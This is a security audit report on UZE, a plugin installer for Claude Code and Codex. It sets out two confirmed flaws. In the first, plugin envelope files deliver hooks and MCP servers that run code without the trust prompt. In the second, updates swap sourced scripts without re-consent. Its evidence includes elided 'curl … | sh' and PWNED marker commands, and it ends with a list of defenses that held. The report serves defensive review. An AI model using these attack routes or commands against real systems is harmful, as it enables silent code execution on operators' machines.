Audited commit: 98d1210f · Date: 2026-10-30 · Skill: `security-audit`

Both findings share one root cause. The trust boundary asks about what a
package *declares* in its canonical sources. The harness executes something
wider: the whole delivered tree, and every file a declared command reaches.

## DELIV-1 - A vendor plugin envelope carries hooks and MCP servers past the trust prompt

- **Severity**: High. A plugin runs arbitrary code in the operator's Claude
  Code or Codex, and UZE's one consent gate never shows it. This is the
  boundary `trust.rs` exists to enforce.
- **Status**: CONFIRMED. The PoC ran, and it was reproduced independently in
  a fresh box.
- **Threat actor**: a malicious plugin or marketplace author (1), or a
  malicious repository (2) whose `agents.yaml` declares the marketplace by
  `path:`.
- **Preconditions**: the operator installs a plugin that ships
  `.claude-plugin/plugin.json` or `.codex-plugin/plugin.json`.
- **Location**:
  - `crates/uze-core/src/delivery/engine.rs:29-170` (`expand`) reads only
    `skills/**/SKILL.md`, `agents/**/*.md`, the root `mcp.json` and the
    root `hooks.json`.
  - `crates/uze-core/src/package/trust.rs:205-233` (`executable_capabilities`,
    `package_executions`) builds the trust request from those alone.
  - `crates/uze-integrations/src/shared/marketplace.rs:357-372`
    (`materialize_explicit_package`) mirrors the whole package tree into the
    explicit marketplace that the harness installs. `has_envelope`
    (`marketplace.rs:137`) selects that path.
- **Attack**: the plugin `notes` ships a harmless skill plus any of the
  following:
  - `.claude-plugin/plugin.json` with inline `hooks.SessionStart` and
    `mcpServers`;
  - `hooks/hooks.json`;
  - `.mcp.json`.

  Each runs `sh -c '...'`. The same command placed in a canonical
  `mcp.json` (plugin `canon`) is the control.
- **Evidence**:
  ```
  install canon (canonical mcp.json)  -> error: TRUST_REQUIRED: `canon` declares an executable capability … (exit 1)
  install notes (envelope only)       -> + notes   1 plugin installed (exit 0, no prompt)
  ~/.uze/runtime/attachments/claude/explicit/plugins/evil/notes/{.claude-plugin/plugin.json,hooks/hooks.json,.mcp.json}
    still contain the `touch …/PWNED-DELIV1-*` and `curl … | sh` commands
  ```
- **Root cause**: the trust request is computed from canonical sources,
  while the explicit delivery hands the harness the whole package. Nothing
  makes the two agree. The Generated origin is not affected, because it
  synthesizes the envelope from canonical sources only.

## ACQ-1 - An update swaps executed code without consent when the command names a file at the package root

- **Severity**: High. A marketplace trusted once gains silent arbitrary code
  execution on every later `uze update`, including non-interactive runs and
  `auto_update`.
- **Status**: CONFIRMED. The PoC ran, and it was reproduced independently in
  a fresh box.
- **Threat actor**: a malicious marketplace or plugin author (1).
- **Preconditions**: the plugin was installed once with `--trust`, and the
  author controls later commits.
- **Location**:
  - `crates/uze-core/src/package/trust.rs:456-461` (`code_identity`): when a
    command word names a root-level file, `relative.parent()` is empty, so
    the digest covers that file alone.
  - The digest is consumed by `introduces_new_execution`
    (`trust.rs:~486`) and by the re-consent decision in
    `crates/uze-application/src/application/lifecycle/{install,update}.rs`.
- **Attack**: the MCP command is `sh ${PLUGIN_ROOT}/run.sh`, and the root
  `run.sh` sources `lib/payload.sh`. Version 2 changes only
  `lib/payload.sh`, to `touch …/PWNED-ACQ-1`.
- **Evidence**:
  ```
  update WITHOUT --trust, non-interactive
  ↑ helper@evil   file:///…/market@61fa840…   1 plugin updated   exit=0
  stored payload: touch /home/attacker/work/PWNED-ACQ-1; echo pwned
  control (change run.sh itself): ! the newer revision asks to execute something new … confirm it explicitly
  ```
- **Root cause**: the code identity is the set of entries the command line
  names lexically. A script pulls in files that no command word names, so
  any digest narrower than the package under-covers.

## Defenses that held

- Git option injection (`--upload-pack`, a leading `-` in a URL, ref or
  subdir) is refused by `reject_option_shaped` at every acquisition entry,
  and `--` and `--end-of-options` are used.
- Every git call clears the environment and sets `GIT_CONFIG_NOSYSTEM`,
  `GIT_CONFIG_GLOBAL=/dev/null`, `core.hooksPath=/dev/null`,
  `core.fsmonitor=false`, `safe.bareRepository=explicit`,
  `submodule.recurse=false` and the `GIT_ALLOW_PROTOCOL` whitelist. `.git`
  is removed before ingest.
- Inline URL credentials are refused.
- `marketplace.json` `source` traversal (`..`, absolute) is refused
  lexically and canonically.
- Symlinks out of the package (absolute, `..`, chains) are refused on
  ingest and before trust, and `stand_in_for_links` re-checks them.
- FIFOs, case-folded collisions and the size, entry and depth budgets are
  enforced, and git output is capped and timed.
- Marketplace shadowing surfaces as `PluginNameCollision` or
  `MarketplaceConflict`.
- A project lock verifies the full-tree sha256 (`IntegrityMismatch` on a
  moved tag).
- First install without a tty yields `TRUST_REQUIRED`, a project-declared
  source always crosses trust, and the trust dialog renders fields inert.
- The compiled POSIX hook wrapper quotes `${PLUGIN_ROOT}` per context,
  validates the timeout and fails closed.
- Agent, skill and package names are charset-validated, and declared paths
  are checked by components.
- Codex MCP names that would parse as flags are refused (`is_cli_safe_token`).
